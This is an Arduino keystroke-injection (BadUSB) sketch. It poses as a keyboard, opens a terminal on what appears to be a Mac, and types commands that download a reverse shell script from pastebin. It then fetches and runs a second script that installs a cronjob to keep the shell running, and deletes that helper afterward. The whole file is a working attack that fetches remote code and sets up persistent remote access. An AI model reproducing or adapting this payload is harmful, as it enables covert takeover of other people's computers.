#include <Keyboard.h> 

// Init function
void setup()
{
  // Start the keyboard.
  Keyboard.begin();

  // Waiting 1000ms for init. Start the payload.
  delay(1000);

  // Open the search bar for searching applications.
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();
  delay(500);
  
  // Open the terminal
  Keyboard.print("terminal");
  typeKey(KEY_RETURN);
  typeKey(KEY_RETURN);
  delay(500);
  
  // Download the reverse shell payload on the target system.
  Keyboard.print("cd; curl -s https://pastebin.com/raw/zvVs5Qtq --output zvVs5Qtq.sh");
  typeKey(KEY_RETURN);
  typeKey(KEY_RETURN);
  delay(500);

  // Make the reverse shell payload executable. 
  // Download the cronjob for executing the reverse shell.
  Keyboard.print("chmod +x zvVs5Qtq.sh; curl -s https://pastebin.com/raw/rZFrgMae --output rZFrgMae.sh");
  //Keyboard.print("chmod +x zvVs5Qtq.sh; ./zvVs5Qtq.sh");
  typeKey(KEY_RETURN);
  typeKey(KEY_RETURN);
  delay(500);

  // Make the crontab script executable and run it 
  // (the script makes a cronjob that runs the reverse shell payload). 
  // Remove the cronjob script afterwards.
  Keyboard.print("chmod +x rZFrgMae.sh;./rZFrgMae.sh; rm rZFrgMae.sh");
  typeKey(KEY_RETURN);
  typeKey(KEY_RETURN);
  delay(800);

  // Close the terminal after finishing
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();  

  // End payload
  // Stop keyboard
  Keyboard.end();
}

// Utility function
void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

// Unused
void loop() {}